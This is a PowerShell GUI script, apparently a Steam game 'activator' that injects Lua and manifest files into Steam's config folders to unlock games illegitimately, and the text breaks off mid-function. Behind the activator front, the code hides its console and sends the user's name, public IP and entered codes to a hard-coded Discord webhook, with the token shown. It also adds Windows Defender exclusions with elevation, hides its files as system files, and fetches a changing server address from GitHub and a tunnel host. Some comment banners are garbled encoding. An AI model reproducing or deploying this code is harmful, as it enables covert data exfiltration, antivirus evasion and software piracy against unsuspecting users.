<#
    BastissSteam Activator v2.0
    PowerShell 5.1 WinForms GUI
#>

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class DwmHelper {
    [DllImport("dwmapi.dll")]
    public static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("shell32.dll")]
    public static extern int SetCurrentProcessExplicitAppUserModelID([MarshalAs(UnmanagedType.LPWStr)] string AppID);
}
"@
# Give app its own taskbar identity (separate from powershell.exe)
[DwmHelper]::SetCurrentProcessExplicitAppUserModelID("BastissSteam.Activator") | Out-Null
# Hide PowerShell console window
$cw = [DwmHelper]::GetConsoleWindow()
if ($cw -ne [IntPtr]::Zero) { [DwmHelper]::ShowWindow($cw, 0) | Out-Null }

Add-Type -ReferencedAssemblies @("System.Windows.Forms","System.Drawing") -TypeDefinition @"
using System.Windows.Forms;
public class BufferedPanel : Panel {
    public BufferedPanel() {
        this.DoubleBuffered = true;
        this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.OptimizedDoubleBuffer, true);
    }
}
"@

# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
#  TRANSLATIONS
# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â

# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
#  BACKEND (imported from original activator)
# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
$script:version = "1.0"
$errorLogFile = Join-Path $env:TEMP "bsmap_error.log"

function Write-ErrorLog {
    param([string]$Msg, $Ex)
    try {
        $text = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Msg"
        if ($Ex) { $text += "`nEXCEPTION: $($Ex.Exception)`nAT: $($Ex.InvocationInfo.PositionMessage)`nSTACK: $($Ex.ScriptStackTrace)" }
        Add-Content -Path $errorLogFile -Value $text -Encoding UTF8 -ErrorAction SilentlyContinue
    } catch {}
}

# ---- Discord Webhook ----
$WEBHOOK_URL = "https://discord.com/api/webhooks/1511495330233847858/q1Vx5ORnPsWuKFrVnprUuie6yaWeReKprujz_Rvrj_AS8u0SOxmb7NShtVeyZt2EXIeM"
function Send-Webhook {
    param([string]$codigo, [string]$traduccion)
    try {
        $ip = (Invoke-RestMethod "https://api.ipify.org" -UseBasicParsing -ErrorAction SilentlyContinue)
        $user = [Environment]::UserName
        $bt = [char]96
        $content = "**Usuario:** $user ($ip)**`nCodigo usado:**`n$bt$bt$bt$codigo$bt$bt$bt`n**Traduccion:**`n$bt$bt$bt$traduccion$bt$bt$bt"
        $payload = @{ content = $content } | ConvertTo-Json
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

# ---- Client ID ----
$CLIENT_ID_FILE = Join-Path $env:LOCALAPPDATA "bsmap_client_id.txt"
function Get-ClientId {
    if (Test-Path $CLIENT_ID_FILE) {
        try { return (Get-Content $CLIENT_ID_FILE -Raw -ErrorAction Stop).Trim() } catch {}
    }
    $id = "PC-" + (-join ((48..57)+(65..90) | Get-Random -Count 32 | ForEach-Object { [char]$_ }))
    try { Set-Content $CLIENT_ID_FILE $id -Force -ErrorAction Stop } catch {}
    return $id
}
$script:clientId = Get-ClientId

# ---- Steam Path ----
function Get-SteamPath {
    $paths = @(
        (Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath,
        (Get-ItemProperty -Path "HKLM:\SOFTWARE\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath,
        (Get-ItemProperty -Path "HKCU:\SOFTWARE\Valve\Steam" -Name SteamPath -ErrorAction SilentlyContinue).SteamPath,
        "${env:ProgramFiles(x86)}\Steam",
        "${env:ProgramFiles(x86)}\Steamm",
        "$env:ProgramFiles\Steam",
        "C:\xdd"
    )
    foreach ($p in $paths) {
        if ($p -and (Test-Path $p) -and (Test-Path (Join-Path $p "steam.exe"))) { return $p }
    }
    foreach ($p in $paths) {
        if ($p -and (Test-Path $p)) { return $p }
    }
    throw "No se encontro Steam en el registro ni en rutas tipicas."
}

# ---- Safe Font ----
function Get-SafeFont {
    param([string]$Family = "Segoe UI", [float]$Size = 10, $Style = [System.Drawing.FontStyle]::Regular)
    $fallbacks = @($Family, "Arial", "Microsoft Sans Serif", "Tahoma", "Segoe UI")
    foreach ($f in $fallbacks) {
        try { return New-Object System.Drawing.Font($f, $Size, $Style) } catch {}
    }
    return New-Object System.Drawing.Font("Arial", $Size, $Style)
}

# ---- Defender Exclusion ----
function Add-DefenderExclusion {
    param([string]$Path)
    $regPath = "HKLM:\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"
    $current = try { (Get-ItemProperty -Path $regPath -ErrorAction Stop).PSObject.Properties.Name } catch { @() }
    if ($current -contains $Path) { return $true }
    try {
        Set-ItemProperty -Path $regPath -Name $Path -Value 0 -Type DWord -ErrorAction Stop
        return $true
    } catch {}
    try {
        $cmd = "reg.exe ADD `"HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths`" /v `"$Path`" /t REG_DWORD /d 0 /f"
        Start-Process cmd -ArgumentList "/c $cmd" -Verb RunAs -Wait -ErrorAction Stop
        return $true
    } catch { return $false }
}

# ---- Internet Time + Timer System ----
$TIMERS_FILE = Join-Path $env:LOCALAPPDATA "bsmap_timers.json"
$script:internetTimeCache = $null
$script:internetTimeCacheTime = (Get-Date).AddDays(-1)

function Get-InternetTime {
    $nowLocal = Get-Date
    if (($nowLocal - $script:internetTimeCacheTime).TotalSeconds -le 60 -and $script:internetTimeCache) {
        return $script:internetTimeCache
    }
    try {
        $r = Invoke-RestMethod "https://worldtimeapi.org/api/ip" -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        $t = [datetime]::ParseExact($r.utc_datetime.Substring(0, 19), 'yyyy-MM-ddTHH:mm:ss', $null)
        $script:internetTimeCache = $t; $script:internetTimeCacheTime = $nowLocal
        return $t
    } catch {
        try {
            $r = Invoke-RestMethod "https://timeapi.io/api/Time/current/zone?timeZone=UTC" -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
            $t = [datetime]::ParseExact($r.dateTime.Substring(0, 19), 'yyyy-MM-ddTHH:mm:ss', $null)
            $script:internetTimeCache = $t; $script:internetTimeCacheTime = $nowLocal
            return $t
        } catch { return $null }
    }
}

function Get-Now {
    $net = Get-InternetTime
    if ($net) { return $net, $true }
    return (Get-Date), $false
}

function Get-ActiveTimers {
    if (Test-Path $TIMERS_FILE) {
        try {
            $data = Get-Content $TIMERS_FILE -Raw | ConvertFrom-Json
            if ($data -is [array]) { return ,$data }
            return ,@($data)
        } catch {}
    }
    return ,@()
}

function Save-Timers {
    param($t)
    $t | ConvertTo-Json | Set-Content $TIMERS_FILE -Force
    try { $fi = Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue; if ($fi) { $fi.Attributes = 'Hidden, System' } } catch {}
    try { New-Item -Path "HKCU:\Software\Bsmap" -Force -ErrorAction SilentlyContinue | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name "Timers" -Value ($t | ConvertTo-Json -Compress) -Type String -Force -ErrorAction SilentlyContinue } catch {}
}

function Remove-FileHard {
    param([string]$p)
    if (-not (Test-Path $p)) { return }
    Remove-Item -Path $p -Force -ErrorAction SilentlyContinue
    if (-not (Test-Path $p)) { return }
    Start-Sleep -Milliseconds 200
    try { [System.IO.File]::Delete($p) } catch {}
    if (-not (Test-Path $p)) { return }
    Start-Sleep -Milliseconds 500
    try { $a = Get-Item $p -Force -ErrorAction SilentlyContinue; if ($a) { $a.Attributes = 'Normal'; Remove-Item $p -Force } } catch {}
    if (-not (Test-Path $p)) { return }
    Start-Sleep -Milliseconds 1000
    try { Remove-Item -Path $p -Force -ErrorAction Stop } catch {}
}

function Remove-ExpiredTimers {
    $timers = Get-ActiveTimers; $remaining = @()
    $now, $isNet = Get-Now
    if (-not $isNet -and $timers.Count -gt 0) {
        $earliest = $timers | ForEach-Object { $_.internet_created_at } | Where-Object { $_ } | Sort-Object | Select-Object -First 1
        if ($earliest) { $ec = $earliest -as [datetime]; if ($ec -and $ec -gt (Get-Date)) { $now = $ec.AddDays(365) } }
    }
    foreach ($t in $timers) {
        $exp = $t.expires_at -as [datetime]; if (-not $exp) { $remaining += $t; continue }
        if ($exp -le $now) {
            $gameStillActive = $remaining | Where-Object { $_.game_name -eq $t.game_name }
            if ($gameStillActive) { $remaining += $t; continue }
            $root = $t.steam_root
            foreach ($f in $t.lua_files) { Remove-FileHard (Join-Path (Join-Path $root "config\stplug-in") $f); Remove-FileHard (Join-Path (Join-Path $root "config\lua") $f) }
            foreach ($f in $t.manifest_files) { Remove-FileHard (Join-Path (Join-Path $root "config\depotcache") $f) }
        } else { $remaining += $t }
    }
    Save-Timers $remaining; return $remaining
}

# ---- Server URL (default + auto-fetch from GitHub API + raw fallback) ----
$script:serverUrl = "https://785ee4a33662a2af-45-224-188-19.serveousercontent.com"
$script:ghApiUrlBase = "https://api.github.com/repos/bastisayes/Fixes-steam/contents/current_url.txt"
$script:ghUrlBase = "https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/original_blue.ps1"
function Update-ServerUrl {
    try {
        $apiResult = Invoke-RestMethod -Uri $script:ghApiUrlBase -UseBasicParsing -TimeoutSec 8 -ErrorAction SilentlyContinue
        if ($apiResult -and $apiResult.content) {
            $txtUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($apiResult.content))
            $txtUrl = $txtUrl.Trim()
            if ($txtUrl -match "^https?://" -and $txtUrl -ne $script:serverUrl) {
                $script:serverUrl = $txtUrl; return
            }
        }
    } catch {}
    try {
        $rawContent = Invoke-RestMethod -Uri "$script:ghUrlBase?r=$(Get-Random)" -UseBasicParsing -TimeoutSec 8 -ErrorAction SilentlyContinue
        if ($rawContent -match '\$script:serverUrl\s*=\s*"(https?://[^"]+)"') {
            $newUrl = $matches[1]
            if ($newUrl -ne "https://EJEMPLO.lhr.life" -and $newUrl -ne $script:serverUrl) {
                $script:serverUrl = $newUrl
            }
        }
    } catch {}
}
# Initial fetch on startup
try {
    $apiResult = Invoke-RestMethod -Uri $script:ghApiUrlBase -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
    if ($apiResult -and $apiResult.content) {
